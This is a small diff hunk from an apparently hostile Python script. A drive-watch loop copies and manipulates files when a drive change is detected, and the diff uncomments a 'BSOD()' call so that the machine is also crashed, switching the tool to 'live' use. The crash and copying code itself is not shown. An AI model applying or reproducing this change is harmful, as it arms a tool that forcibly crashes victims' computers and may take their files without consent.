@@ -189,7 +189,7 @@ def watch_drives():#watch for drive change
             runCon=False
             fileManip() #file copying and manipulation function
             time.sleep(6)
-            # BSOD() #BSOD function, Please comment it unless using it live
+            BSOD() #BSOD function, Please comment it unless using it live
 
         time.sleep(1)
 
